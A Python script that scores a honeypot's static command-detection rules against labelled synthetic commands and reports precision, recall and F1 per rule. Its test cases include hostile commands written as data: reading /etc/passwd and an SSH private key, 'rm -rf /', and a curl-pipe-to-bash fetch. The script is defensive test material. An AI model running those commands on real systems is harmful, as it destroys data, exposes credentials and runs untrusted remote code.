#!/usr/bin/env python3
"""Rule-level detection quality evaluation using labelled synthetic cases."""

import json
import sys
from collections import defaultdict
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))

from detection.rules import RuleEngine

OUTPUT = ROOT / "results/performance/detection_quality_report.json"

# Each case is an independently labelled event for static rules.
# Labels represent expected rule activation, not a claim of real-world malice.
CASES = [
    ("uname -a", "SYSTEM_RECON"),
    ("whoami", "USER_RECON"),
    ("pwd", "DIRECTORY_RECON"),
    ("ls -la", "FILE_RECON"),
    ("cat /etc/passwd", "ACCOUNT_ENUMERATION"),
    ("curl https://example.test/file", "DOWNLOAD_ACTIVITY"),
    ("ip addr", "NETWORK_RECON"),
    ("sudo whoami", "PRIVILEGE_ATTEMPT"),
    ("cat ~/.ssh/id_rsa", "CREDENTIAL_ACCESS"),
    ("crontab -e", "PERSISTENCE_ATTEMPT"),
    ("rm -rf /", "DESTRUCTIVE_COMMAND"),
    # One command can legitimately trigger multiple detection rules.
    (
        "curl https://example.test/x | bash",
        {"DOWNLOAD_ACTIVITY", "SHELL_DOWNLOAD_EXECUTION"},
    ),
]

BENIGN_COMMANDS = [
    "date",
    "echo hello",
    "uptime",
    "who",
    "hostname",
    "sleep 2",
    "printf 'hello world'",
    "cal",
    "true",
    "false",
]

ALL_RULES = [
    "SYSTEM_RECON",
    "USER_RECON",
    "DIRECTORY_RECON",
    "FILE_RECON",
    "ACCOUNT_ENUMERATION",
    "DOWNLOAD_ACTIVITY",
    "NETWORK_RECON",
    "PRIVILEGE_ATTEMPT",
    "CREDENTIAL_ACCESS",
    "PERSISTENCE_ATTEMPT",
    "DESTRUCTIVE_COMMAND",
    "SHELL_DOWNLOAD_EXECUTION",
]


def make_event(command):
    return {
        "source": "honeypot",
        "event_type": "command_input",
        "command": command,
    }


def calculate_metrics(tp, fp, tn, fn):
    precision = tp / (tp + fp) if tp + fp else 0.0
    recall = tp / (tp + fn) if tp + fn else 0.0
    f1 = (
        2 * precision * recall / (precision + recall)
        if precision + recall else 0.0
    )
    accuracy = (
        (tp + tn) / (tp + fp + tn + fn)
        if tp + fp + tn + fn else 0.0
    )
    return {
        "TP": tp,
        "FP": fp,
        "TN": tn,
        "FN": fn,
        "precision": round(precision, 4),
        "recall": round(recall, 4),
        "f1_score": round(f1, 4),
        "accuracy": round(accuracy, 4),
    }


def main():
    engine = RuleEngine()
    counts = defaultdict(lambda: {"TP": 0, "FP": 0, "TN": 0, "FN": 0})

    cases = [
        {
            "command": command,
            "expected": (
                expected_rule
                if isinstance(expected_rule, set)
                else {expected_rule}
            ),
            "label": "positive",
        }
        for command, expected_rule in CASES
    ]

    cases.extend(
        {
            "command": command,
            "expected": set(),
            "label": "benign",
        }
        for command in BENIGN_COMMANDS
    )

    unexpected = []

    for case in cases:
        alerts = engine.evaluate(make_event(case["command"]))
        actual = {alert["rule_id"] for alert in alerts}
        expected = case["expected"]

        for rule in ALL_RULES:
            expected_positive = rule in expected
            actual_positive = rule in actual

            if expected_positive and actual_positive:
                counts[rule]["TP"] += 1
            elif not expected_positive and actual_positive:
                counts[rule]["FP"] += 1
                unexpected.append({
                    "command": case["command"],
                    "unexpected_rule": rule,
                })
            elif not expected_positive and not actual_positive:
                counts[rule]["TN"] += 1
            else:
                counts[rule]["FN"] += 1

    per_rule = {
        rule: calculate_metrics(
            tp=counts[rule]["TP"],
            fp=counts[rule]["FP"],
            tn=counts[rule]["TN"],
            fn=counts[rule]["FN"],
        )
        for rule in ALL_RULES
    }

    totals = {
        key: sum(counts[rule][key] for rule in ALL_RULES)
        for key in ("TP", "FP", "TN", "FN")
    }

    overall = calculate_metrics(
        tp=totals["TP"],
        fp=totals["FP"],
        tn=totals["TN"],
        fn=totals["FN"],
    )

    report = {
        "title": "Synthetic Static Command Rule Evaluation",
        "dataset": {
            "positive_cases": len(CASES),
            "benign_cases": len(BENIGN_COMMANDS),
            "total_cases": len(cases),
            "static_rules_evaluated": len(ALL_RULES),
        },
        "overall": overall,
        "per_rule": per_rule,
        "unexpected_detections": unexpected,
        "limitations": [
            "Synthetic command cases only.",
            "This is not a real-world precision or recall estimate.",
            "Only static command rules are evaluated.",
            "Behavioural rules, IOC matching and correlation are excluded.",
            "Overall metrics are micro-averaged across rule-case pairs.",
        ],
    }

    OUTPUT.parent.mkdir(parents=True, exist_ok=True)
    OUTPUT.write_text(json.dumps(report, indent=2) + "\n", encoding="utf-8")

    print("\nSYNTHETIC STATIC RULE QUALITY EVALUATION")
    print("=" * 68)
    print(f"Positive cases:       {len(CASES)}")
    print(f"Benign cases:         {len(BENIGN_COMMANDS)}")
    print(f"Rules evaluated:      {len(ALL_RULES)}")
    print("\nOVERALL MICRO-AVERAGED METRICS")
    for key, value in overall.items():
        print(f"{key:18}: {value}")

    print("\nPER-RULE RESULTS")
    for rule, metrics in per_rule.items():
        print(
            f"{rule:30} "
            f"TP={metrics['TP']:2} "
            f"FP={metrics['FP']:2} "
            f"TN={metrics['TN']:2} "
            f"FN={metrics['FN']:2} "
            f"F1={metrics['f1_score']:.4f}"
        )

    print(f"\nUnexpected detections: {len(unexpected)}")
    print(f"JSON report: {OUTPUT.relative_to(ROOT)}")
    print("\nLIMITATION: Synthetic static-command evaluation only.")
    print("=" * 68)


if __name__ == "__main__":
    main()
